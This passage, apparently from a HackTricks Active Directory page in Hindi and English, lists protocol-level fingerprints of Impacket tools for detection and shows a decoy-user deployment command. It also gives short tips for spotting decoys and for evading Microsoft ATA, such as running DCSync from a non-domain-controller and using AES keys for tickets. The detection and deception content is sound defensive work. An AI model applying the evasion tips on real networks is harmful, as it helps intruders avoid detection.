### Impacket activity का Protocol-level fingerprinting

यदि आप common AD tradecraft detect करना चाहते हैं, तो **केवल operator-controlled artifacts** जैसे renamed binaries, service names, temp batch files, या output paths पर निर्भर **न रहें**। वैध Windows clients द्वारा [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC, और WMI traffic बनाने के तरीके का baseline तैयार करें, फिर उन **implementation quirks** को खोजें जो operator द्वारा `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py`, या `ntlmrelayx.py` edit करने के बाद भी मौजूद रहते हैं।<sup>[[8]](#references)</sup>

- **अपने baseline के विरुद्ध validation के बाद high-confidence standalone candidates**:
- `auth_context_id = 79231 + ctx_id` का उपयोग करने वाला authenticated DCE/RPC
- `0xff` से भरी हुई DCE/RPC authentication padding
- ऐसे LDAP Kerberos binds जो raw Kerberos `AP-REQ` को सीधे SPNEGO `mechToken` में रखते हैं
- ASCII-जैसे `ClientGuid` values वाले SMB2/3 negotiate requests
- non-standard namespace `//./root/cimv2` का उपयोग करने वाला WMI `IWbemLevel1Login::NTLMLogin`
- Hardcoded Kerberos nonce values
- **Correlation/scoring features के रूप में अधिक उपयोगी**:
- Sparse या duplicated Kerberos etype lists, असामान्य/missing `PA-DATA`, या native Windows से अलग TGS-REQ etype ordering
- Version info के बिना NTLM Type 1 messages या null host names वाले Type 3 messages
- SPNEGO के बजाय DCE/RPC में carried raw NTLMSSP, missing DCE/RPC verification trailers, या SPNEGO/Kerberos OID mismatches
- एक ही host/user/session/time window से ऐसे कई traits किसी एक कमजोर field की तुलना में कहीं अधिक मजबूत संकेत होते हैं
- **Standalone alerts के बजाय enrichment के रूप में उपयोग करें**:
- Default filenames, output paths, random service names, temporary batch names, default computer account names, और tool-specific HTTP/WebDAV/RDP/MSSQL strings
- Operators के लिए इन्हें बदलना आसान है; इनका सर्वोत्तम उपयोग यह समझाने में होता है कि cross-protocol cluster suspicious क्यों है
- **Operational notes**:
- इनमें से कुछ signals के लिए decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, या service-side visibility आवश्यक है
- Alerts में promote करने से पहले Samba/Linux clients, appliances, और legacy software के विरुद्ध validation करें
- Baseline में confidence बढ़ने के साथ detections को enrichment -> hunting -> alerting में promote करें

### **Deception Techniques को Implement करना**

- Deception implement करने में decoy users या computers जैसे traps सेट करना शामिल है, जिनमें passwords का expire न होना या Trusted for Delegation के रूप में marked होना जैसी features होती हैं। एक detailed approach में specific rights वाले users बनाना या उन्हें high privilege groups में add करना शामिल है।<sup>[[2]](#references)</sup>
- एक practical example में इन tools का उपयोग शामिल है: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception techniques deploy करने के बारे में अधिक जानकारी [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) पर मिल सकती है।

### **Deception की पहचान करना**

- **User Objects के लिए**: Suspicious indicators में atypical ObjectSID, infrequent logons, creation dates, और low bad password counts शामिल हैं।
- **General Indicators**: संभावित decoy objects के attributes की genuine objects के attributes से तुलना करने पर inconsistencies सामने आ सकती हैं। [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) जैसे tools ऐसी deceptions की पहचान में सहायता कर सकते हैं।

### **Detection Systems को Bypass करना**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection को रोकने के लिए Domain Controllers पर session enumeration से बचें।
- **Ticket Impersonation**: ticket creation के लिए **aes** keys का उपयोग detection से बचने में सहायता करता है, क्योंकि इससे NTLM पर downgrade नहीं होता।
- **DCSync Attacks**: ATA detection से बचने के लिए इन्हें non-Domain Controller से execute करने की सलाह दी जाती है, क्योंकि Domain Controller से direct execution alerts trigger करेगा।

## References

- [1] [Domain Trusts पर हमला करने की मार्गदर्शिका](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory में Deception के लिए Trusts को Forge करना](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin से Enterprise Admin तक](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – Active Directory Exploitation के लिए In-Memory LDAP Toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM Hashes को Wordlist के रूप में Weaponize करना](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket का विश्लेषण](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Netlogon के माध्यम से Active Directory Accounts पर कब्ज़ा करना](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472 से संबंधित Netlogon secure channel connections में changes को manage करने का तरीका](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [भूले हुए Null Session और MS-RPC interfaces की यात्रा](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Domains के बीच security boundary के रूप में SID filter? (Part 4) - Bypass SID filtering research](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Domains के बीच security boundary के रूप में SID filter? (Part 5) - Golden GMSA trust attack - child से parent तक](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Domains के बीच security boundary के रूप में SID filter? (Part 6) - Schema change trust attack - child से parent तक](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5 के साथ DA से EA तक](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS का abuse करके child domain के admins से enterprise admins तक 5 मिनट में escalation, एक follow up](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Active Directory DACL Backdoors को Design करना](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
